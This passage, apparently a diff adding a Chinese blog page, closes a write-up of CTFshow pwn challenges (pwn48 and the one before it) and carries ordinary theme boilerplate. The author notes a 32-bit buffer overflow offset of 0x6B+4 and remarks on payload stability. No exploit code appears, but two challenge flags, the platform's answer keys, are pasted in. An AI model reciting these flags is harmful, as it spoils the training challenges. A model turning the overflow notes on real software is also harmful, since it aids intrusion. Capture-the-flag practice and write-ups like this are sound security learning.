+<p>这边主要是输完一次命令就结束了，所以只能重新再来一次再cat</p>
+<p>ctfshow{821639b6-e401-4b4a-aa46-0c44ee9e7ce7}</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758942892411-b6db274a-6ae3-4c3a-a320-cef208ff7475.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边第二个payload如果写返回值为cyclic（4）会更优雅点，更稳点，我写的似乎不太好，有偶然性</p>
+<h2 id="pwn48"><a href="#pwn48" class="headerlink" title="pwn48"></a>pwn48</h2><p>竟然不是上一次的64版本</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943614747-d82b50af-b274-4b7a-837e-2cd20d3ca38b.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943639003-d7958330-900e-404a-885a-f77a4a17dd02.png" srcset="/img/loading.gif" lazyload></p>
+<p>32位的？看看保护</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943689720-c1e3c7b9-7cf1-4e73-9926-7ddd2040587e.png" srcset="/img/loading.gif" lazyload></p>
+<p>似乎没什么区别哇？上一个也不是write啊，不是一直在用puts吗</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943771069-bd513695-955a-47ae-8e78-79fe5d599938.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943776898-179026ed-e3f9-4a0c-84fe-9cb958f77bc3.png" srcset="/img/loading.gif" lazyload></p>
+<p>溢出变成0x6B+4了</p>
+<p><img src="/CTFshow-Pwn-9%E6%9C%88%E8%AE%B0%E5%BD%95/1758943834184-2b7c82a8-6926-4ce7-8768-1d9669efa7bd.png" srcset="/img/loading.gif" lazyload></p>
+<p>真正的意义不明，和上一题除了溢出大小就是一模一样</p>
+<p>ctfshow{63e0d89c-30fd-47bf-aae0-0f5495ae5007}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTFshow-Pwn-9月记录</div>
+      <div>https://mei-you-qian.github.io/2025/09/30/CTFshow-Pwn-9月记录/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Meiyouqian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年9月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/10/23/2025SPC%E9%80%89%E6%8B%94%E8%B5%9B/" title="2025SPC选拔赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025SPC选拔赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/22/%E7%BA%BD%E7%9B%BE%E5%9F%B9%E8%AE%AD/" title="暑期培训">
+                        <span class="hidden-mobile">暑期培训</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"cloud1-9g1zftrh46f4164f","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
